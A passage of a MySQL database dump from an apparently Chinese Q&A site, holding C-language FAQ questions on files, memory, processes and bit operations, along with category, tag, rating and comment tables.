验一个文件是否存在？如果请求的输入文件不存在，我希望向用户提出警告。',41,NULL,0,NULL,0),(480,0,'20150713100715',2,'',0,0,'怎样在读入文件前，知道文件大小？',37,NULL,0,NULL,0),(481,0,'20150713100715',2,'',0,0,'怎样得到文件的修改日期和时间？',63,NULL,0,NULL,0),(482,0,'20150713100715',2,'',0,0,'怎样原地缩短一个文件而不用清除或重写？',42,NULL,0,NULL,0),(483,0,'20150713100716',2,'',0,0,'怎样在文件中插入或删除一行(或一条记录)？',37,NULL,0,NULL,0),(484,0,'20150713100716',2,'',0,0,'怎样从一个打开的流或文件描述符得到文件名？',43,NULL,0,NULL,0),(485,0,'20150713100716',2,'',0,0,'怎样删除一个文件？',48,NULL,0,NULL,0),(486,0,'20150713100717',2,'',0,0,'怎样复制文件？',33,NULL,0,NULL,0),(487,0,'20150713100717',2,'',0,0,'为什么用了详尽的路径还不能打开文件？下面的代码会返回错误。Fopen(\"c:\\newdir\\file.dat\",\"r\")',38,NULL,0,NULL,0),(488,0,'20150713100717',2,'',0,0,'fopen不让我打开文件\"$HOME/.profile\"和\"~~/.myrcfile\"。',28,NULL,0,NULL,0),(489,0,'20150713100717',2,'',0,0,'怎样制止MS-DOS下令人恐怖的“Abort，Retry，Ignore?”信息？',40,NULL,0,NULL,0),(490,0,'20150713100717',2,'',0,0,'遇到“Toomanyopenfiles(打开文件太多)”的错误，怎样增加同时打开文件的允许数目？',32,NULL,0,NULL,0),(491,0,'20150713100718',2,'',0,0,'如何得到磁盘的可用空间大小？',56,NULL,0,NULL,0),(492,0,'20150713100718',2,'',0,0,'怎样在C语言中读入目录？',47,NULL,0,NULL,0),(493,0,'20150713100718',2,'',0,0,'如何创建目录？如何删除目录(及其内容)？',32,NULL,0,NULL,0),(494,0,'20150713100718',2,'',0,0,'怎样找出系统还有多少内存可用？',31,NULL,0,NULL,0),(495,0,'20150713100718',2,'',0,0,'怎样分配大于64K的数组或结构？',32,NULL,0,NULL,0),(496,0,'20150713100719',2,'',0,0,'错误信息“DGROUPdataallocationexceeds64K(DGROUP数据分配内存超过64K)”什么意思？我应该怎么做？我以为使用了大内存模型，就可以使用大于64K的数据！',51,NULL,0,NULL,0),(497,0,'20150713100719',2,'',0,0,'怎样访问位于某特定地址的内存(内存映射的设备或图形显示内存)？',45,NULL,0,NULL,0),(498,0,'20150713100719',2,'',0,0,'如何访问机器地址0处的中断向量？如果将指针设为0，编译器可能把它转成一个非零的内部空指针值。',52,NULL,0,NULL,0),(499,0,'20150713100720',2,'',0,0,'怎样在一个C程序中调用另一个程序(独立可执行的程序或系统命令)？',42,NULL,0,NULL,0),(500,0,'20150713100720',2,'',0,0,'如果运行时才知道要执行的命令的参数(文件名等)，应该如何调用system？',50,NULL,0,NULL,0),(501,0,'20150713100720',2,'',0,0,'在MS-DOS上如何得到system返回的准确错误状态？',37,NULL,0,NULL,0),(502,0,'20150713100720',2,'',0,0,'怎样调用另一个程序或命令，然后获取它的输出？',45,NULL,0,NULL,0),(503,0,'20150713100720',2,'',0,0,'怎样才能发现程序自己的执行文件的全路径？',38,NULL,0,NULL,0),(504,0,'20150713100721',2,'',0,0,'怎样找出和执行文件在同一目录的配置文件？',37,NULL,0,NULL,0),(505,0,'20150713100721',2,'',0,0,'进程如何改变它的调用者的环境变量？',40,NULL,0,NULL,0),(506,0,'20150713100721',2,'',0,0,'如何打开命令行给出的文件并解析选项？',40,NULL,0,NULL,0),(507,0,'20150713100721',2,'',0,0,'exit(status)是否真的和从main函数返回同样的status等价？',40,NULL,0,NULL,0),(508,0,'20150713100721',2,'',0,0,'怎样读入一个对象文件并跳跃到其中的函数？',51,NULL,0,NULL,0),(509,0,'20150713100722',2,'',0,0,'怎样以小于1秒的精度延时或计算用户响应时间？',47,NULL,0,NULL,0),(510,0,'20150713100722',2,'',0,0,'怎样捕获或忽略control-C这样的键盘中断？',31,NULL,0,NULL,0),(511,0,'20150713100722',2,'',0,0,'怎样简洁地处理浮点异常？',38,NULL,0,NULL,0),(512,0,'20150713100722',2,'',0,0,'怎样使用socket？如何联网？如何写客户/服务器程序？',25,NULL,0,NULL,0),(513,0,'20150713100722',2,'',0,0,'怎样调用BIOS函数？如何写ISR？如何创建TSR？',48,NULL,0,NULL,0),(514,0,'20150713100723',2,'',0,0,'什么是“near”和“far”指针？',48,NULL,0,NULL,0),(515,0,'20150713100723',2,'',0,0,'我不能使用这些非标准、依赖系统的函数，程序需要兼容ANSI!',45,NULL,0,NULL,0),(516,0,'20150713100723',2,'',0,0,'为什么这些内容没有在C语言中进行标准化？任何现实程序都会用到这些东西。',52,NULL,0,NULL,0),(517,0,'20150713100723',2,'',0,0,'怎样从函数返回多个值？',65,NULL,0,NULL,0),(518,0,'20150713100723',2,'',0,0,'用什么数据结构存储文本行最好？我开始用固定大小的char型数组的数组，但是有很多局限。',40,NULL,0,NULL,0),(519,0,'20150713100724',2,'',0,0,'怎样打开命令行提到的文件并处理参数？',39,NULL,0,NULL,0),(520,0,'20150713100724',2,'',0,0,'如何正确地使用errno？',43,NULL,0,NULL,0),(521,0,'20150713100724',2,'',0,0,'怎样写数据文件，使之可以在不同字大小、字节顺序或浮点格式的机器上读入？',43,NULL,0,NULL,0),(522,0,'20150713100724',2,'',0,0,'怎样用char*指针指向的函数名调用函数？',43,NULL,0,NULL,0),(523,0,'20150713100724',2,'',0,0,'如何操作各个位？',63,NULL,0,NULL,0),(524,0,'20150713100725',2,'',0,0,'怎样实现位数组或集合？　',54,NULL,0,NULL,0),(525,0,'20150713100725',2,'',0,0,'怎样判断机器的字节顺序是高字节在前还是低字节在前？',54,NULL,0,NULL,0),(526,0,'20150713100725',2,'',0,0,'怎样调换字节？',40,NULL,0,NULL,0),(527,0,'20150713100725',2,'',0,0,'怎样将整数转换到二进制或十六进制？',45,NULL,0,NULL,0),(528,0,'20150713100726',2,'',0,0,'可以使用二进制常数(类似这样的东西)吗？printf有二进制的格式说明符吗？',34,NULL,0,NULL,0),(529,0,'20150713100726',2,'',0,0,'用什么方法计算整数中为1的位的个数最高效？',47,NULL,0,NULL,0),(530,0,'20150713100726',2,'',0,0,'怎样提高程序的效率？',34,NULL,0,NULL,0),(531,0,'20150713100726',2,'',0,0,'指针真的比数组快吗？函数调用会拖慢程序多少？++i比i=i+1快吗？',36,NULL,0,NULL,0),(532,0,'20150713100727',2,'',0,0,'用移位操作符替换乘法和除法是否有价值？',33,NULL,0,NULL,0),(533,0,'20150713100727',2,'',0,0,'人们说编译器优化得很好，我们不再需要为速度而写汇编了，但我的编译器连用移位代替i/=2都做不到。',46,NULL,0,NULL,0),(534,0,'20150713100727',2,'',0,0,'怎样不用临时变量而交换两个值？',41,NULL,0,NULL,0),(535,0,'20150713100727',2,'',0,0,'switch语句和if/else链哪个更高效？',34,NULL,0,NULL,0),(536,0,'20150713100728',2,'',0,0,'是否有根据字符串进行条件切换的方法？',73,NULL,0,NULL,0),(537,0,'20150713100728',2,'',0,0,'是否有使用非常量case行标的方法(如范围或任意的表达式)？',53,NULL,0,NULL,0),(538,0,'20150713100728',2,'',0,0,'return语句外层的括号是否真的可选择？',42,NULL,0,NULL,0),(539,0,'20150713100728',2,'',0,0,'为什么C语言的注释不能嵌套？怎样注释掉含有注释的代码？引号包含的字符串内的注释是否合法？',48,NULL,0,NULL,0),(540,0,'20150713100728',2,'',0,0,'为什么C语言的操作符不设计得更全面一些？好像还缺了一些^^、&&=和-=这样的操作符。',40,NULL,0,NULL,0),(541,0,'20150713100729',2,'',0,0,'C语言有循环移位操作符吗？',48,NULL,0,NULL,0),(542,0,'20150713100729',2,'',0,0,'C是个伟大的语言还是别的什么东西？哪个其他语言可以写出像a+++++b这样的代码？',45,NULL,0,NULL,0),(543,0,'20150713100729',2,'',0,0,'如果赋值操作符是:=，是不是就不容易意外地写出if(a=b)了？',50,NULL,0,NULL,0),(544,0,'20150713100729',2,'',0,0,'C语言有和Pascal的with等价的语句吗？',42,NULL,0,NULL,0),(545,0,'20150713100729',2,'',0,0,'为什么C语言没有嵌套函数？',52,NULL,0,NULL,0),(546,0,'20150713100730',2,'',0,0,'assert是什么？如何使用？',40,NULL,0,NULL,0),(547,0,'20150713100730',2,'',0,0,'怎样从C中调用FORTRAN(C++、BASIC、Pascal、Ada、LISP)的函数？反之如何？',53,NULL,0,NULL,0),(548,0,'20150713100730',2,'',0,0,'有什么程序可以将Pascal或FORTRAN(或LISP、Ada、awk、“老”C)程序转化为C程序？',41,NULL,0,NULL,0),(549,0,'20150713100730',2,'',0,0,'C++是C的超集吗？可以用C++编译器来编译C代码吗？',49,NULL,0,NULL,0),(550,0,'20150713100731',2,'',0,0,'我需要用到“近似”的strcmp例程，比较两个字符串的近似度，并不需要完全一样。有什么好办法？',42,NULL,0,NULL,0),(551,0,'20150713100752',2,'',0,0,'如何生成正态或高斯分布的随机数？',38,NULL,0,NULL,0),(552,0,'20150713100752',2,'',0,0,'如何知道某个日期是星期几？',46,NULL,0,NULL,0),(553,0,'20150713100752',2,'',0,0,'(year%4==0)是否足以判断闰年？年是闰年吗？',46,NULL,0,NULL,0),(554,0,'20150713100752',2,'',0,0,'为什么tm结构中的tm_sec的范围是，暗示一分钟有62秒？',49,NULL,0,NULL,0),(555,0,'20150713100753',2,'',0,0,'一个难题：怎样写一个输出自己源代码的程序？',104,NULL,0,NULL,0),(556,0,'20150713100753',2,'',0,0,'什么是“达夫设备”(Duff’sDevice)？',107,NULL,0,NULL,0),(557,0,'20150713100753',2,'',0,0,'下届国际C语言混乱代码竞赛(InternationalObfuscatedCCodeContest，IOCCC)什么时候进行？哪里可以找到当前和以前的获胜代码？',48,NULL,0,NULL,0),(558,0,'20150713100753',2,'',0,0,'K&R1提到的关键字entry是什么？',50,NULL,0,NULL,0),(559,0,'20150713100754',2,'',0,0,'C的名字从何而来？',117,NULL,0,NULL,0),(560,0,'20150713100754',2,'',0,0,'“char”如何发音？',116,NULL,0,NULL,0),(561,0,'20150713100754',2,'',0,0,'“lvalue”和“rvalue”代表什么意思？',114,NULL,0,NULL,0);
/*!40000 ALTER TABLE `question` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `question_category`
--

DROP TABLE IF EXISTS `question_category`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `question_category` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `category_id` bigint(20) NOT NULL,
  `question_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FK6733B537AA78CA61` (`category_id`),
  KEY `FK6733B537BED47E4A` (`question_id`)
) ENGINE=MyISAM AUTO_INCREMENT=562 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `question_category`
--

LOCK TABLES `question_category` WRITE;
/*!40000 ALTER TABLE `question_category` DISABLE KEYS */;
INSERT INTO `question_category` VALUES (1,1,1),(2,1,2),(3,1,3),(4,1,4),(5,1,5),(6,1,6),(7,1,7),(8,1,8),(9,1,9),(10,1,10),(11,1,11),(12,1,12),(13,1,13),(14,1,14),(15,1,15),(16,1,16),(17,1,17),(18,1,18),(19,1,19),(20,1,20),(21,1,21),(22,1,22),(23,1,23),(24,1,24),(25,1,25),(26,1,26),(27,1,27),(28,1,28),(29,1,29),(30,1,30),(31,1,31),(32,1,32),(33,1,33),(34,1,34),(35,1,35),(36,1,37),(37,1,39),(38,1,40),(39,1,41),(40,1,42),(41,1,43),(42,1,44),(43,1,45),(44,1,46),(45,1,47),(46,1,48),(47,1,49),(48,1,50),(49,1,51),(50,1,52),(51,1,54),(52,1,55),(53,1,56),(54,1,57),(55,2,53),(56,3,36),(57,4,58),(58,4,59),(59,6,59),(60,4,60),(61,7,61),(62,2,62),(63,2,63),(64,2,64),(65,2,65),(66,2,66),(67,3,67),(68,3,68),(69,3,69),(70,3,70),(71,4,71),(74,4,74),(75,4,75),(76,4,76),(77,4,77),(78,4,78),(79,4,79),(80,4,80),(81,4,81),(82,4,82),(83,4,83),(84,4,84),(85,4,85),(86,4,86),(87,4,87),(88,4,88),(89,4,89),(90,4,90),(91,4,91),(92,4,92),(93,4,93),(94,4,94),(95,4,95),(96,4,96),(97,4,97),(98,4,98),(99,4,99),(100,4,100),(101,4,101),(102,4,102),(103,4,103),(104,4,104),(105,4,105),(106,4,106),(107,4,107),(108,4,108),(109,4,109),(110,4,110),(111,4,111),(112,4,112),(113,4,113),(114,4,114),(115,4,115),(116,4,116),(117,4,117),(118,4,118),(119,4,119),(120,4,120),(121,4,121),(122,4,122),(123,4,123),(124,4,124),(125,4,125),(126,4,126),(127,4,127),(128,4,128),(129,4,129),(130,4,130),(131,4,131),(132,4,132),(133,4,133),(134,4,134),(135,4,135),(136,4,136),(137,4,137),(138,4,138),(139,4,139),(140,4,140),(141,4,141),(142,4,142),(143,4,143),(144,4,144),(145,4,145),(146,4,146),(147,4,147),(148,4,148),(149,4,149),(150,4,150),(151,4,151),(152,4,152),(153,4,153),(154,4,154),(155,4,155),(156,4,156),(157,4,157),(158,4,158),(159,4,159),(160,4,160),(161,4,161),(162,4,162),(163,4,163),(164,4,164),(165,4,165),(166,4,166),(167,4,167),(168,4,168),(169,4,169),(170,4,170),(171,4,171),(172,4,172),(173,4,173),(174,4,174),(175,4,175),(176,4,176),(177,4,177),(178,4,178),(179,4,179),(180,4,180),(181,4,181),(182,4,182),(183,4,183),(184,4,184),(185,4,185),(186,4,186),(187,4,187),(188,4,188),(189,4,189),(190,4,190),(191,4,191),(192,4,192),(193,4,193),(194,4,194),(195,4,195),(196,4,196),(197,4,197),(198,4,198),(199,4,199),(200,4,200),(201,4,201),(202,4,202),(203,4,203),(204,4,204),(205,4,205),(206,4,206),(207,4,207),(208,4,208),(209,4,209),(210,4,210),(211,4,211),(212,4,212),(213,4,213),(214,4,214),(215,4,215),(216,4,216),(217,4,217),(218,4,218),(219,4,219),(220,4,220),(221,4,221),(222,4,222),(223,4,223),(224,4,224),(225,4,225),(226,4,226),(227,4,227),(228,4,228),(229,4,229),(230,4,230),(231,4,231),(232,4,232),(233,4,233),(234,4,234),(235,4,235),(236,4,236),(237,4,237),(238,4,238),(239,4,239),(240,4,240),(241,4,241),(242,4,242),(243,4,243),(244,4,244),(245,4,245),(246,4,246),(247,4,247),(248,4,248),(249,4,249),(250,4,250),(251,4,251),(252,4,252),(253,4,253),(254,4,254),(255,4,255),(256,4,256),(257,4,257),(258,4,258),(259,4,259),(260,4,260),(261,4,261),(262,4,262),(263,4,263),(264,4,264),(265,4,265),(266,4,266),(267,4,267),(268,4,268),(269,4,269),(270,4,270),(271,4,271),(272,4,272),(273,4,273),(274,4,274),(275,4,275),(276,4,276),(277,4,277),(278,4,278),(279,4,279),(280,4,280),(281,4,281),(282,4,282),(283,4,283),(284,4,284),(285,4,285),(286,4,286),(287,4,287),(288,4,288),(289,4,289),(290,4,290),(291,4,291),(292,4,292),(293,4,293),(294,4,294),(295,4,295),(296,4,296),(297,4,297),(298,4,298),(299,4,299),(300,4,300),(301,4,301),(302,4,302),(303,4,303),(304,4,304),(305,4,305),(306,4,306),(307,4,307),(308,4,308),(309,4,309),(310,4,310),(311,4,311),(312,4,312),(313,4,313),(314,4,314),(315,4,315),(316,4,316),(317,4,317),(318,4,318),(319,4,319),(320,4,320),(321,4,321),(322,4,322),(323,4,323),(324,4,324),(325,4,325),(326,4,326),(327,4,327),(328,4,328),(329,4,329),(330,4,330),(331,4,331),(332,4,332),(333,4,333),(334,4,334),(335,4,335),(336,4,336),(337,4,337),(338,4,338),(339,4,339),(340,4,340),(341,4,341),(342,4,342),(343,4,343),(344,4,344),(345,4,345),(346,4,346),(347,4,347),(348,4,348),(349,4,349),(350,4,350),(351,4,351),(352,4,352),(353,4,353),(354,4,354),(355,4,355),(356,4,356),(357,4,357),(358,4,358),(359,4,359),(360,4,360),(361,4,361),(362,4,362),(363,4,363),(364,4,364),(365,4,365),(366,4,366),(367,4,367),(368,4,368),(369,4,369),(370,4,370),(371,4,371),(372,4,372),(373,4,373),(374,4,374),(375,4,375),(376,4,376),(377,4,377),(378,4,378),(379,4,379),(380,4,380),(381,4,381),(382,4,382),(383,4,383),(384,4,384),(385,4,385),(386,4,386),(387,4,387),(388,4,388),(389,4,389),(390,4,390),(391,4,391),(392,4,392),(393,4,393),(394,4,394),(395,4,395),(396,4,396),(397,4,397),(398,4,398),(399,4,399),(400,4,400),(401,4,401),(402,4,402),(403,4,403),(404,4,404),(405,4,405),(406,4,406),(407,4,407),(408,4,408),(409,4,409),(410,4,410),(411,4,411),(412,4,412),(413,4,413),(414,4,414),(415,4,415),(416,4,416),(417,4,417),(418,4,418),(419,4,419),(420,4,420),(421,4,421),(422,4,422),(423,4,423),(424,4,424),(425,4,425),(426,4,426),(427,4,427),(428,4,428),(429,4,429),(430,4,430),(431,4,431),(432,4,432),(433,4,433),(434,4,434),(435,4,435),(436,4,436),(437,4,437),(438,4,438),(439,4,439),(440,4,440),(441,4,441),(442,4,442),(443,4,443),(444,4,444),(445,4,445),(446,4,446),(447,4,447),(448,4,448),(449,4,449),(450,4,450),(451,4,451),(452,4,452),(453,4,453),(454,4,454),(455,4,455),(456,4,456),(457,4,457),(458,4,458),(459,4,459),(460,4,460),(461,4,461),(462,4,462),(463,4,463),(464,4,464),(465,4,465),(466,4,466),(467,4,467),(468,4,468),(469,4,469),(470,4,470),(471,4,471),(472,4,472),(473,4,473),(474,4,474),(475,4,475),(476,4,476),(477,4,477),(478,4,478),(479,4,479),(480,4,480),(481,4,481),(482,4,482),(483,4,483),(484,4,484),(485,4,485),(486,4,486),(487,4,487),(488,4,488),(489,4,489),(490,4,490),(491,4,491),(492,4,492),(493,4,493),(494,4,494),(495,4,495),(496,4,496),(497,4,497),(498,4,498),(499,4,499),(500,4,500),(501,4,501),(502,4,502),(503,4,503),(504,4,504),(505,4,505),(506,4,506),(507,4,507),(508,4,508),(509,4,509),(510,4,510),(511,4,511),(512,4,512),(513,4,513),(514,4,514),(515,4,515),(516,4,516),(517,4,517),(518,4,518),(519,4,519),(520,4,520),(521,4,521),(522,4,522),(523,4,523),(524,4,524),(525,4,525),(526,4,526),(527,4,527),(528,4,528),(529,4,529),(530,4,530),(531,4,531),(532,4,532),(533,4,533),(534,4,534),(535,4,535),(536,4,536),(537,4,537),(538,4,538),(539,4,539),(540,4,540),(541,4,541),(542,4,542),(543,4,543),(544,4,544),(545,4,545),(546,4,546),(547,4,547),(548,4,548),(549,4,549),(550,4,550),(551,4,551),(552,4,552),(553,4,553),(554,4,554),(555,4,555),(556,4,556),(557,4,557),(558,4,558),(559,4,559),(560,4,560),(561,4,561);
/*!40000 ALTER TABLE `question_category` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `question_tag`
--

DROP TABLE IF EXISTS `question_tag`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `question_tag` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `create_date` varchar(255) NOT NULL,
  `question_id` bigint(20) NOT NULL,
  `tag_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FKF5C2C7C1BED47E4A` (`question_id`),
  KEY `FKF5C2C7C1BD49DC94` (`tag_id`)
) ENGINE=MyISAM AUTO_INCREMENT=94 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `question_tag`
--

LOCK TABLES `question_tag` WRITE;
/*!40000 ALTER TABLE `question_tag` DISABLE KEYS */;
INSERT INTO `question_tag` VALUES (1,'20150603104120',1,3),(2,'20150603104120',3,3),(3,'20150603104120',3,4),(4,'20150603104120',5,5),(5,'20150603104120',12,6),(6,'20150603104120',14,7),(7,'20150603104120',15,8),(8,'20150603104120',15,9),(9,'20150603104120',16,10),(10,'20150603104120',16,11),(11,'20150603104120',16,12),(12,'20150603104120',17,13),(13,'20150603104120',17,14),(14,'20150603104120',17,15),(15,'20150603104120',19,16),(16,'20150603104120',19,17),(17,'20150603104120',19,18),(18,'20150603104120',20,19),(19,'20150603104120',20,20),(20,'20150603104120',21,19),(21,'20150603104120',21,21),(22,'20150603104120',22,19),(23,'20150603104120',22,21),(24,'20150603104120',23,19),(25,'20150603104120',23,21),(26,'20150603104120',24,10),(27,'20150603104120',24,22),(28,'20150603104120',25,10),(29,'20150603104120',25,23),(30,'20150603104120',26,10),(31,'20150603104120',26,24),(32,'20150603104120',26,25),(33,'20150603104120',27,10),(34,'20150603104120',27,26),(35,'20150603104120',29,27),(36,'20150603104120',30,28),(37,'20150603104120',31,10),(38,'20150603104120',31,29),(39,'20150603104120',32,30),(40,'20150603104120',33,31),(41,'20150603104120',34,10),(42,'20150603104120',35,10),(43,'20150603104120',50,32),(44,'20150603104120',49,33),(45,'20150603104120',46,16),(46,'20150603104120',45,10),(47,'20150603104120',42,10),(48,'20150603104120',39,10),(49,'20150603104120',40,34),(50,'20150603104120',50,35),(51,'20150603104120',51,36),(52,'20150603104120',51,37),(53,'20150603104120',51,38),(54,'20150603104120',51,10),(55,'20150603104120',52,10),(56,'20150603104120',52,39),(57,'20150603104120',52,40),(58,'20150603104120',53,41),(59,'20150603104120',53,42),(60,'20150603104120',54,43),(61,'20150603104120',54,44),(62,'20150603104120',55,45),(63,'20150603104120',56,46),(64,'20150603104120',56,3),(65,'20150603104120',56,47),(66,'20150603104120',56,48),(67,'20150603104120',57,3),(68,'20150603104120',57,49),(69,'20150603104120',58,50),(70,'20150627224456',59,127),(71,'20150702115251',60,128),(72,'20150702115251',60,129),(73,'20150712123340',62,41),(74,'20150712123340',62,130),(78,'20150712124229',64,131),(77,'20150712124229',64,41),(79,'20150712124229',64,132),(80,'20150712125437',65,41),(81,'20150712125437',65,133),(82,'20150712125556',66,41),(83,'20150712125556',66,134),(84,'20150713072115',67,142),(85,'20150713072115',67,143),(86,'20150713072115',67,144),(87,'20150713072214',68,142),(88,'20150713072214',68,145),(89,'20150713072342',69,142),(90,'20150713072342',69,146),(91,'20150713080103',70,142),(92,'20150713080103',70,147),(93,'20150713080730',71,108);
/*!40000 ALTER TABLE `question_tag` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `rate`
--

DROP TABLE IF EXISTS `rate`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `rate` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `ask_id` bigint(20) NOT NULL,
  `create_date` varchar(255) NOT NULL,
  `is_support` bit(1) NOT NULL,
  `user_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FK_t66tlpl7g0h6eejwee772elbt` (`ask_id`) USING BTREE,
  KEY `FK_77yqfbt46ieusrih4afeh6yk0` (`user_id`) USING BTREE,
  KEY `FK354CE0936822CA` (`ask_id`),
  KEY `FK354CE08C5B8E5` (`user_id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `rate`
--

LOCK TABLES `rate` WRITE;
/*!40000 ALTER TABLE `rate` DISABLE KEYS */;
INSERT INTO `rate` VALUES (1,12,'20150419201352','',1),(2,28,'20150420091757','',5),(3,30,'20150421141644','',5),(4,54,'20150710185954','',4);
/*!40000 ALTER TABLE `rate` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `remark`
--

DROP TABLE IF EXISTS `remark`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `remark` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `article_id` bigint(20) NOT NULL,
  `content` longtext,
  `create_date` varchar(255) NOT NULL,
  `oppose_num` int(11) NOT NULL,
  `support_num` int(11) NOT NULL,
  `user_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FK_fdk4242bypdjc0caxct1uruxq` (`article_id`) USING BTREE,
  KEY `FK_c16f1ag3fklk7armhth8h7sc9` (`user_id`) USING BTREE,
  KEY `FKC84AC380E792E6AC` (`article_id`),
  KEY `FKC84AC3808C5B8E5` (`user_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `remark`
--

LOCK TABLES `remark` WRITE;
/*!40000 ALTER TABLE `remark` DISABLE KEYS */;
/*!40000 ALTER TABLE `remark` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `remark_rate`
--

DROP TABLE IF EXISTS `remark_rate`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `remark_rate` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `create_date` varchar(255) NOT NULL,
  `is_support` bit(1) NOT NULL,
  `remark_id` bigint(20) NOT NULL,
  `user_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FK_odwcuqn7eai8p4eyp5hmmlod8` (`remark_id`) USING BTREE,
  KEY `FK_2avpuce536y1ini18qq0sb9w5` (`user_id`) USING BTREE,
  KEY `FK76D3723FB29BC2C8` (`remark_id`),
  KEY `FK76D3723F8C5B8E5` (`user_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `remark_rate`
--

LOCK TABLES `remark_rate` WRITE;
/*!40000 ALTER TABLE `remark_rate` DISABLE KEYS */;
/*!40000 ALTER TABLE `remark_rate` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `remark_reply`
--

DROP TABLE IF EXISTS `remark_reply`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `remark_reply` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `at_user_id` bigint(20) DEFAULT NULL,
  `create_date` varchar(255) NOT NULL,
  `remark_id` bigint(20) NOT NULL,
  `user_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FK_infodwn0ukvogs9h5q4wp27uc` (`at_user_id`) USING BTREE,
  KEY `FK_jcbjtea939npj29muq9s5mfqe` (`remark_id`) USING BTREE,
  KEY `FK_3drt3gk7nmqtnwo0yg3r2jv9a` (`user_id`) USING BTREE,
  KEY `FK639C996B542B88D9` (`at_user_id`),
  KEY `FK639C996BB29BC2C8` (`remark_id`),
  KEY `FK639C996B8C5B8E5` (`user_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `remark_reply`
--

LOCK TABLES `remark_reply` WRITE;
/*!40000 ALTER TABLE `remark_reply` DISABLE KEYS */;
/*!40000 ALTER TABLE `remark_reply` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sys_tag`
--

DROP TABLE IF EXISTS `sys_tag`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `sys_tag` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `create_date` varchar(255) NOT NULL,
  `creator_id` bigint(20) NOT NULL,
  `name` varchar(255) NOT NULL,
  `article_num` bigint(20) NOT NULL,
  `question_num` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `UK_mk1xv8vy67l5trqaht4h900ik` (`name`) USING BTREE,
  KEY `FK_4kiom9nnxgkh2nsc64e56mghr` (`creator_id`) USING BTREE,
  KEY `FK98687F2863C1BCE4` (`creator_id`)
) ENGINE=MyISAM AUTO_INCREMENT=158 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sys_tag`
--

LOCK TABLES `sys_tag` WRITE;
/*!40000 ALTER TABLE `sys_tag` DISABLE KEYS */;
INSERT INTO `sys_tag` VALUES (3,'20150603104120',2,'java',0,0),(4,'20150603104120',2,'文件上传',0,0),(5,'20150603104120',2,'序列化',0,0),(6,'20150603104120',2,'静态内部类',0,0),(7,'20150603104120',2,'final',0,0),(8,'20150603104120',2,'重载',0,0),(9,'20150603104120',2,'继承',0,0),(10,'20150603104120',2,'grails',0,0),(11,'20150603104120',2,'groovy',1,0),(12,'20150603104120',2,'idea',0,0),(13,'20150603104120',2,'连接池',0,0),(14,'20150603104120',2,'c3p0',0,0),(15,'20150603104120',2,'mysql长连接',0,0),(16,'20150603104120',2,'spring',0,0),(17,'20150603104120',2,'aop',0,0),(18,'20150603104120',2,'cglib2',0,0),(19,'20150603104120',2,'struts2',0,0),(20,'20150603104120',2,'异常',0,0),(21,'20150603104120',2,'ssh整合',0,0),(22,'20150603104120',2,'数据源可配置',0,0),(23,'20150603104120',2,'assets',0,0),(24,'20150603104120',2,'html标签',0,0),(25,'20150603104120',2,'安全',0,0),(26,'20150603104120',2,'filter',0,0),(27,'20150603104120',2,'乱码',0,0),(28,'20150603104120',2,'JCaptcha',0,0),(29,'20150603104120',2,'自定义标签',0,0),(30,'20150603104120',2,'jna',0,0),(31,'20150603104120',2,'设计模式',0,0),(32,'20150603104120',2,'hibernate',0,0),(33,'20150603104120',2,'gc',0,0),(34,'20150603104120',2,'List',0,0),(35,'20150603104120',2,'session',0,0),(36,'20150603104120',2,'hql',0,0),(37,'20150603104120',2,'sql距离计算',0,0),(38,'20150603104120',2,'经纬度距离',0,0),(39,'20150603104120',2,'动态数据源配置',0,0),(40,'20150603104120',2,'DataSource',0,0),(41,'20150603104120',2,'js',0,0),(42,'20150603104120',2,'jsloader',0,0),(43,'20150603104120',2,'j2ee',0,0),(44,'20150603104120',2,'架构',1,0),(4